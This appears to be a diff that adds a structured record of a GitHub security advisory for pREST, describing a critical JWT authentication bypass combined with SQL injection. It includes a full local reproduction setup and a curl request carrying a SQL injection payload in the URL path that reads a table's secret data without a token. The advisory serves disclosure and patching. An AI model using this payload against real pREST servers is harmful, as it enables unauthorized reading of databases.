@@ -1,0 +1,148 @@
+advisory_id: GHSA-wm25-j4gw-6vr3
+datasource_id: github_osv/GHSA-wm25-j4gw-6vr3
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-wm25-j4gw-6vr3/GHSA-wm25-j4gw-6vr3.json
+aliases: []
+summary: |
+  pREST vulnerable to jwt bypass + sql injection
+  ### Summary
+  Probably jwt bypass + sql injection
+  or what i'm doing wrong?
+
+  ### PoC (how to reproduce)
+
+  1. Create following files:
+
+  docker-compose.yml:
+  ```
+  services:
+    postgres:
+      image: postgres
+      container_name: postgres_container_mre
+      environment:
+        POSTGRES_USER: test_user_pg
+        POSTGRES_PASSWORD: test_pass_pg
+        POSTGRES_DB: test_db
+    prest:
+      image: prest/prest
+      build: .
+      volumes:
+        - ./queries:/queries
+        - ./migrations:/migrations
+      ports:
+        - "3000:3000"
+  ```
+
+  Dockerfile:
+  ```
+  from prest/prest:latest
+
+  COPY ./prest.toml prest.toml
+  ```
+
+  prest.toml:
+  ```
+  debug=false
+  migrations = "./migrations"
+
+  [http]
+  port = 3000
+
+  [jwt]
+  default = true
+  key = "secret"
+  algo = "HS256"
+
+  [auth]
+  enabled = true
+  type = "body"
+  encrypt = "MD5"
+  table = "prest_users"
+  username = "username"
+  password = "password"
+
+  [pg]
+  URL = "postgresql://test_user_pg:test_pass_pg@postgres:5432/test_db/?sslmode=disable"
+
+  [ssl]
+  mode = "disable"
+  sslcert = "./PATH"
+  sslkey = "./PATH"
+  sslrootcert = "./PATH"
+
+  [expose]
+  enabled = true
+  databases = true
+  schemas = true
+  tables = true
+
+  [queries]
+  location = "/queries"
+  ```
+
+
+  2. run commands:
+
+  ```
+  mkdir -p migrations queries
+  docker compose up --build -d
+  ```
+  wait for pg and prest, then run following to add test data to the pg:
+
+  ```
+  export PGPASSWORD=test_pass_pg
+  docker exec -it postgres_container_mre psql -U test_user_pg -d test_db -c "CREATE TABLE IF NOT EXISTS public.some_table (id int primary key, secret_data text);\
+  INSERT INTO public.some_table (id, secret_data) VALUES (1, 'some secret text') ON CONFLICT DO NOTHING;"
+  ```
+
+  3. SQL injection even without jwt token:
+  ```
+  curl --location '127.0.0.1:3000/test_db/public".some_table)%20s;--/auth'
+  ```
+  output:
+  ```
+  [{"id": 1, "secret_data": "some secret text"}]
+  ```
+impacted_packages:
+  - purl: pkg:github/prest/prest
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/prest/prest
+        commit: 96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-wm25-j4gw-6vr3/GHSA-wm25-j4gw-6vr3.json
+  - score: '9.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-wm25-j4gw-6vr3/GHSA-wm25-j4gw-6vr3.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-287
+  - CWE-89
+references:
+  - url: https://github.com/prest/prest
+    reference_type:
+    reference_id:
+  - url: https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e
+    reference_type:
+    reference_id:
+  - url: https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3
+    reference_type:
+    reference_id:
+  - url: https://pkg.go.dev/vuln/GO-2024-3011
+    reference_type:
+    reference_id:
+exploits: []
